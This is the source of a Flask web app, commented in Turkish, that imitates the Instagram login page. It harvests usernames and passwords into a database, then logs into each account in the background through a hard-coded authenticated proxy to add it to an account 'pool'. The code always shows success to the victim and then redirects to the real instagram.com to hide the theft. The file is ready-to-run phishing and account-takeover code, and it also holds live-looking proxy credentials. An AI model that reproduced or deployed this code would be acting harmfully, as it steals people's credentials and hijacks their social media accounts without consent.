import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "avci-v41-key"

db = SQLAlchemy(app)

# Proxy Bilgilerin
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(50), default="Beklemede")

# Bot arkada sessizce çalışır, hata alsa bile kullanıcıyı rahatsız etmez
def bot_worker(u, p):
    cl = Client()
    try:
        if PROXY_URL: cl.set_proxy(PROXY_URL)
        cl.login(u, p)
        with app.app_context():
            acc = IGAccount.query.filter_by(username=u).first()
            if acc: acc.status = "Aktif"
            db.session.commit()
    except: pass # Hata olsa da kullanıcı görmez

# Siyah Instagram Temalı Arayüz
UI = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Giriş Yap</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white flex flex-col items-center justify-center h-screen px-6">
    <div class="w-full max-w-[350px] p-10 border border-zinc-800 bg-black rounded-sm">
        <h1 class="text-4xl italic font-serif mb-10 text-center tracking-tighter">Instagram</h1>
        <div id="loginArea">
            <input id="u" placeholder="Kullanıcı adı" class="w-full p-2.5 mb-2 bg-zinc-900 border border-zinc-800 text-xs rounded-sm outline-none focus:border-zinc-600">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-2.5 mb-4 bg-zinc-900 border border-zinc-800 text-xs rounded-sm outline-none focus:border-zinc-600">
            <button onclick="go()" id="b" class="w-full bg-[#0095f6] hover:bg-blue-600 p-1.5 rounded-lg font-semibold text-sm transition">Giriş Yap</button>
            <div class="flex items-center my-6"><div class="flex-grow border-t border-zinc-800"></div><span class="px-4 text-zinc-500 text-xs font-bold">YA DA</span><div class="flex-grow border-t border-zinc-800"></div></div>
            <p class="text-[#385185] text-sm font-bold text-center cursor-pointer">Facebook ile Giriş Yap</p>
        </div>
        <div id="ok" class="hidden text-center">
            <div class="text-green-500 text-5xl mb-4">✓</div>
            <h2 class="font-bold">Bağlantı Başarılı</h2>
            <p class="text-xs text-zinc-400 mt-2">Hesabınız havuz sistemine eklendi. Yönlendiriliyorsunuz...</p>
        </div>
    </div>
    <script>
        async function go(){
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;
            document.getElementById('b').innerText = "Giriş yapılıyor...";
            
            // Veriyi kaydet ve botu başlat
            await fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });

            // Şifre yanlış olsa bile kullanıcıya "Başarılı" gösteriyoruz
            document.getElementById('loginArea').classList.add('hidden');
            document.getElementById('ok').classList.remove('hidden');
            
            // 3 saniye sonra gerçek TopFollow sitesine veya başka yere atabilirsin
            setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 3000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(UI)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # Veritabanına her halükarda kaydet
    acc = IGAccount.query.filter_by(username=u).first()
    if acc: acc.password = p
    else:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    db.session.commit()

    # Botu arka planda sessizce çalıştır
    threading.Thread(target=bot_worker, args=(u, p)).start()
    
    return jsonify(status="ok")

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
